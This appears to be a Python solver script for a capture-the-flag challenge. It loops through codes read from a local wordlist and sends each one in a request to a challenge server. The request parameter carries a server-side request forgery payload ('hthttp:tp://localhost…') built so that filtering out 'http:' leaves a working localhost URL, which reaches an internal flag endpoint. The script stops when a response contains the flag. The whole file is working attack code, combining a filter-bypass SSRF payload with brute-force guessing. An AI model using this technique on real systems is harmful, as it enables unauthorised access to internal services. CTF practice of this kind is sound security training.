import requests

base_url = "http://chall25.sigx.net:3206/?sp=hthttp:tp://localhost:30147/flag?code={}"

password_file = "code.txt"

with open(password_file, "r") as file:
    passwords = [line.strip() for line in file]

for password in passwords:
    url = base_url.format(password)
    try:
        response = requests.get(url)
        print(f"Trying: {password} -> Status Code: {response.status_code}")
        if "Success" in response.text or response.status_code == 200:
            if "CZ4067" in response.text:
                print(response.text)
                break
    except requests.exceptions.RequestException as e:
        print(f"Error with {password}: {e}")
